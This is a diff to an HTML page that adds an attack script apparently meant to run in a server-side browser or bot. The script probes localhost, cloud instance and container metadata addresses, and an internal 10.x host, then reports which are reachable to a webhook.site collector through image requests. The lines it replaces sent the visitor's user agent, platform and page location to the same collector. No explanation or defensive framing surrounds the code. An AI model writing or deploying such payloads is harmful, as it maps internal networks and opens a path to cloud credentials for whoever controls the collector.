@@ -1,4 +1,21 @@
+<html>
+<body>
+
 <script>
-var data = navigator.userAgent + "|" + navigator.platform + "|" + document.location;
-new Image().src="https://webhook.site/c1c764a3-a349-44c6-a075-ae048e1e78dd/js-"+encodeURIComponent(data);
+
+function probe(url,name){
+ fetch(url,{mode:"no-cors"})
+ .then(()=>{new Image().src="https://webhook.site/c1c764a3-a349-44c6-a075-ae048e1e78dd/"+name+"-reachable"})
+ .catch(()=>{new Image().src="https://webhook.site/c1c764a3-a349-44c6-a075-ae048e1e78dd/"+name+"-blocked"})
+}
+
+probe("http://127.0.0.1","localhost")
+probe("http://127.0.0.1:80","localhost80")
+probe("http://169.254.169.254","metadata")
+probe("http://169.254.170.2","aws-container-metadata")
+probe("http://10.0.0.1","internal10")
+
 </script>
+
+</body>
+</html>
